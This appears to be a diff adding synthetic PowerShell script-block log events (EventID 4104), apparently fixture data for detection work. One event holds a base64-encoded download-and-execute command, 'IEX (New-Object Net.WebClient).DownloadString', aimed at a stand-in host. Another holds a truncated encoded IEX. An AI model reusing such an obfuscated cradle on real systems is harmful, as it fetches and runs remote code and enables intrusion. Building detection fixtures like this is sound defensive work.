@@ -1,0 +1,3 @@
+{"@timestamp":"2026-01-01T00:17:10Z","EventID":4104,"ScriptBlockText":"powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnaAB0AHQAcAA6AC8ALwBlAHgAYQBtAHAAbABlACcAKQA=","User":"CONTOSO\\alice"}
+{"@timestamp":"2026-01-01T00:17:11Z","EventID":4104,"ScriptBlockText":"powershell -EncodedCommand SQBFAFgAIA==","User":"CONTOSO\\alice"}
+
